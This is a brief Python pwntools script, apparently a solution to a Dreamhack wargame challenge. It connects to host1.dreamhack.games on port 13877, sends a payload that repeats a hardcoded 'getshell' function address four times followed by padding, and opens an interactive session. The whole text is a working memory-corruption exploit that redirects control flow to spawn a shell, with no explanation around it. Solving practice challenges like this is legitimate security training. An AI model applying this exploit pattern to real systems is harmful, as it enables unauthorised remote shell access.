from pwn import *

r=remote("host1.dreamhack.games",13877)
print("remote success")
getshell=0x08048641

payload=p32(getshell)*4+"AAAA"

r.send(payload)
r.interactive()

